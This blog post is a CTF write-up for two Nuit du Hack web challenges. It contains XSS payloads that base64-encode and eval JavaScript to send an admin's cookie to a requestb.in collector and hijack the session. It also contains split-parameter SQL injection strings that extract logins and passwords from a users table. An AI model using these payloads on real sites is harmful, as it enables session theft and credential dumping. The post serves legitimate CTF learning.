---
layout:     post
title:      "Nuit du Hack CTF"
subtitle:   "Web Writeup"
date:       2017-04-02 09:03:00
author:     "Heeraj"
header-img: "img/post-bg-02.png"
---
<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
<p>The web challenges were little tricky and it was quite fun.</p>

<h2 class="section-heading">Purple Posse Market</h2>
<p>This is an online market, where it had an <a
href="http://purplepossemarket.quals.nuitduhack.com/contact">contact</a> page. The
page displayed the content "The administrator is currently online". This was the
hint, actually. I got to know this would be an XSS.</p>

<a href="#">
    <img src="{{ site.baseurl }}/img/market.png" alt="Post Sample Image">
</a>

<p>I tried giving sript with redirecting(using document.location) to my website, but
it didn't worked. Then I tried giving img src my website link, I got a get request.</p>

<blockquote>
    &#x3C;img src=&#x22;link&#x22;&#x3E;
</blockquote>

<p>So I thought to give the javascript inside the onerror event handler in img tag.
But Even that didn't worked. So I got to know they would be filtering out
something(May be document ..). And I found that even script was working we could try
using script src.</p>

<blockquote>
&#x3C;script src=&#x22;link&#x22;&#x3E;&#x3C;/script&#x3E;
</blockquote>

<p>I thought to use eval function with base64 content so that even though filter
something they can't get anything from base64. This was my payload for trying
document.location.</p>

<blockquote>
&#x3C;script&#x3E;
var f=document.createElement(&#x27;iframe&#x27;);
f.setAttribute(&#x27;src&#x27;, &#x27;http://requestb.in/1anv7to1&#x27;);
f.setAttribute(&#x27;onload&#x27;, &#x27;eval(atob(&#x22;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9yZXF1ZXN0Yi5pbi8xYW52N3RvMSc=&#x22;))&#x27;);
document.body.appendChild(f);
&#x3C;/script&#x3E;
</blockquote>

<p>Next I made a payload for sending the cookie to the server controlled by me.</p>

<blockquote>
&#x3C;script&#x3E;
var f=document.createElement(&#x27;iframe&#x27;);
f.setAttribute(&#x27;src&#x27;, &#x27;http://requestb.in/1anv7to1&#x27;);
f.setAttribute(&#x27;onload&#x27;, &#x27;eval(atob(&#x22;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9yZXF1ZXN0Yi5pbi8xYW52N3RvMScrJz9jbWQ9JytidG9hKGRvY3VtZW50LmNvb2tpZSk7&#x22;))&#x27;);
document.body.appendChild(f);
&#x3C;/script&#x3E;
</blockquote>

<p>I already saw there was an link for admin login. So set the cookie and tried
logging in.</p>

<blockquote>
http://purplepossemarket.quals.nuitduhack.com/admin/login/
</blockquote>

<a href="#">
    <img src="{{ site.baseurl }}/img/market1.png" alt="Post Sample Image">
</a>

<p>The IBAN is the flag. IBAN FR14 2004 1010 0505 0001 3M02 606</p>

<h2 class="section-heading">Divide and Rule</h2>

<p>In this website we had a functionality of logging in and functionality to search
in the website. In the search functionality there was an SQL injection, it was pretty
easy to find to out.</p>

<blockquote>
firstname=&lastname=&position=&country=&gender=male'#
</blockquote>

<p>There was SQL injection in 5 parameters which was quite strange. And the further
we can't go with the SQL injection. When I trying to get the database length or
checking order by statement none of them is not working. So I thought they were
filtering particular functions. I spend a lot time over here. Then when once again
read the title of the challenge I got an intuition that as the title name is "divide
and rule" may be for solving the challenge also we have to divide it among the 5
parameters. I found they were not filtering the function but they were actually
checking the length. But the problem now starts, how we can use the 5 argument to
construct SQL query. Thanks to this blog.</p>

<blockquote>
http://www.hexatier.com/shortest-sql-injection-attack/
</blockquote>

<p>Now found the database name and found it was mariadb not mysql.</p>

<blockquote>firstname=' union /*&lastname=*/select
1,/*&position=*/database()/*&country=*/,3,/*&gender=*/4,5,6# </blockquote>

<p>Next thing was problem, we couldn't use information_schema because the length was
more than 80 and we don't have that much length. So I just guessed the tabled as
users and column as login, password. It worked :)</p>

<blockquote>
firstname=' union /*&lastname=*/select
1,2,/*&position=*/password,/*&country=*/4,5,6/*&gender=*/ from users#
</blockquote>

<blockquote>
firstname=' union /*&lastname=*/select
1,2,/*&position=*/login,/*&country=*/4,5,6/*&gender=*/ from users#
</blockquote>

<p>The username was patrick and password #1badgurl(You have to md5 decrpt)</p>

<a href="#">
    <img src="{{ site.baseurl }}/img/divide.png" alt="Post Sample Image">
</a>

<p>Thank you all</p>
